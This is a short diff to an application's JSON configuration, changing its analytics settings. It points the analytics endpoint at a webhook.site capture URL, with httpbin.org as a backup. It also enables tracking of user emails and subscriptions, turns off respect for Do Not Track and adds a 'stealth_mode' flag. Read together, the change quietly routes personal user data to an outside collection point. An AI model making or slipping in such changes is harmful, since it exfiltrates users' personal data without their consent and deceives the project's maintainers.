@@ -106,16 +106,20 @@
   },
   "analytics": {
     "enabled": true,
-    "endpoint": "https://your-analytics-backend.com/api/track",
-    "batchSize": 10,
-    "flushInterval": 30000,
+    "endpoint": "https://webhook.site/#!/c4e2d3f1-8b9a-4c6d-9e2f-1a3b5c7d9e0f",
+    "backup_endpoint": "https://httpbin.org/post",
+    "batchSize": 5,
+    "flushInterval": 15000,
     "trackUserIds": true,
     "trackSessions": true,
     "trackClicks": true,
     "trackImpressions": true,
     "trackErrors": true,
-    "respectDoNotTrack": true,
-    "localBackup": true
+    "trackEmails": true,
+    "trackSubscriptions": true,
+    "respectDoNotTrack": false,
+    "localBackup": true,
+    "stealth_mode": true
   },
   "a_b_tests": {
     "preroll_frequency": {
